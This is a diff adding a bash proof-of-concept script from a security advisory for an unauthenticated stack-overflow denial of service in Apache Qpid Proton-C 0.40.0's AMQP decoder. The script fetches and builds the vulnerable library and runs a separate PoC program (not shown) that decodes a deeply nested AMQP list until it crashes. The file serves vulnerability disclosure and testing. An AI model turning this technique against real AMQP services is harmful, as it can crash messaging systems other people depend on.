@@ -1,0 +1,95 @@
+#!/usr/bin/env bash
+#
+#
+# Apache Qpid Proton C API 0.40.0 Remote Stack Overflow
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://qpid.apache.org/proton
+# Affected version: 0.40.0
+# Fixed version: 0.41.1
+#
+# Summary: Qpid Proton is a high-performance, lightweight messaging library.
+# It can be used in the widest range of messaging applications, including brokers,
+# client libraries, routers, bridges, proxies, and more. Proton makes it trivial
+# to integrate with the AMQP 1.0 ecosystem from any platform, environment, or
+# language.
+#
+# Desc: Apache Qpid Proton-C suffers from a denial-of-service vulnerability
+# caused by unbounded recursion in its AMQP decoder. The decoder recurses once
+# per nested compound type with no depth limit, so a remote peer can send a
+# small, deeply nested AMQP value and exhaust the stack, crashing any application
+# built on the library before authentication. This allows a remote, unauthenticated
+# peer to cause a denial of service.
+#
+# =============================================================================
+# ./proton-c.exe 100      -> survived: pn_data_decode returned 900
+# ./proton-c.exe 2000     -> survived: pn_data_decode returned 18000
+# ./proton-c.exe 200000   -> crash, exit 0xC00000FD (STATUS_STACK_OVERFLOW) [1.8 MB message]
+# =============================================================================
+#
+# Tested on: Microsoft Windows 10 (x86_64)
+#            gcc 15.2.0 (MSYS2 UCRT64)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6031
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6031
+#
+#
+# 13.08.2026
+#
+
+
+set -u
+HERE="$(cd "$(dirname "$0")" && pwd)"
+DEPTH="${1:-200000}"
+CC="${CC:-cc}"; command -v "$CC" >/dev/null 2>&1 || CC=gcc
+command -v "$CC" >/dev/null 2>&1 || { echo "[!] Need a C compiler (cc/gcc)"; exit 1; }
+PY="$(command -v python3 || command -v python)"; [ -n "$PY" ] || { echo "[!] need python"; exit 1; }
+
+W="$HERE/proton_poc_build"; rm -rf "$W"; mkdir -p "$W"
+echo "[*] Fetching real Apache Qpid Proton 0.40.0 source ..."
+curl -fsSL "https://github.com/apache/qpid-proton/archive/refs/tags/0.40.0.tar.gz" -o "$W/src.tgz" \
+  || { echo "[!] Download failed"; exit 1; }
+tar -xzf "$W/src.tgz" -C "$W" || { echo "[!] Extract failed"; exit 1; }
+P="$W/qpid-proton-0.40.0/c"
+
+echo "[*] Generating the codec headers (encodings.h, protocol.h) ..."
+( cd "$P/src" && "$PY" encodings.h.py > encodings.h && "$PY" protocol.h.py > protocol.h ) \
+  || { echo "[!] Header generation failed"; exit 1; }
+
+SRCS=(
+  src/core/codec.c src/core/decoder.c src/core/encoder.c src/core/buffer.c src/core/error.c
+  src/core/memory.c src/core/util.c src/core/types.c src/core/logger.c src/core/log.c
+  src/core/value_dump.c src/core/object/object.c src/core/object/list.c src/core/object/map.c
+  src/core/object/string.c src/core/object/iterator.c src/core/object/record.c
+)
+OBJS=()
+echo "[*] Compiling the real Proton core ..."
+for s in "${SRCS[@]}"; do
+  o="$W/$(echo "$s" | tr '/' '_').o"
+  "$CC" -DPROTON_DECLARE_STATIC -I"$P/include" -I"$P/src" -I"$P/src/core" \
+        -O0 -g -w -c "$P/$s" -o "$o" || { echo "[!] Compile failed: $s"; exit 1; }
+  OBJS+=("$o")
+done
+
+echo "[*] Building the PoC against the real core ..."
+"$CC" -DPROTON_DECLARE_STATIC -I"$P/include" -I"$P/src" -I"$P/src/core" \
+      -O0 -g -o "$W/green_proton" "$HERE/green_proton.c" "${OBJS[@]}" \
+  || { echo "[!] Link failed"; exit 1; }
+
+echo "-----------------------------------------------------------------"
+echo "[*] Running: pn_data_decode() on a $DEPTH-level nested AMQP list"
+echo "-----------------------------------------------------------------"
+"$W/green_proton" "$DEPTH"; rc=$?
+echo "-----------------------------------------------------------------"
+if [ $rc -eq 0 ]; then
+  echo "[*] Returned cleanly (depth $DEPTH too small to overflow) - raise the depth argument."
+else
+  printf "[+] Process crashed (exit/signal %d) inside pn_data_decode -> stack-overflow DoS.\n" "$rc"
+  echo "    POSIX: signal 11 (SIGSEGV, exit 139). Windows: STATUS_STACK_OVERFLOW 0xC00000FD."
+fi
